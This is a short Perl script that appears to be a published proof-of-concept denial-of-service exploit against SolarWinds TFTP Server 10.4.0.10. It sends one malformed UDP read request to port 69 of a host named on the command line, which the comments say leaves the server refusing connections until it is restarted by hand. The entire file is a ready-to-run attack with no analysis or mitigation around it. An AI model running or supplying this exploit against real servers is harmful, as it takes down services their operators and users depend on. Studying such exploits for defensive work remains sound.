#!/usr/bin/perl
# SolarWinds TFTP Server 10.4.0.10 Remote DoS Exploit
# by Nullthreat
# The application will not crash, but it will stop accepting connections.
# You will be forced to restart the server by hand in the config
# Thanks to: LoneFerret, CoreLanC0der, PureHate, Rel1k
 
use IO::Socket;
$port = "69";
$host = $ARGV[0];
$s = IO::Socket::INET->new(PeerPort => $port,PeerAddr => $host,Proto=> 'udp');
 
$really=
"\x00\x01". # Opcode 1 = Read Request
"\x01". # The crash....no really thats it
"\x00". # Null byte
"NETASCII". # The mode
"\x00"; # Null byte
$s->send($really);
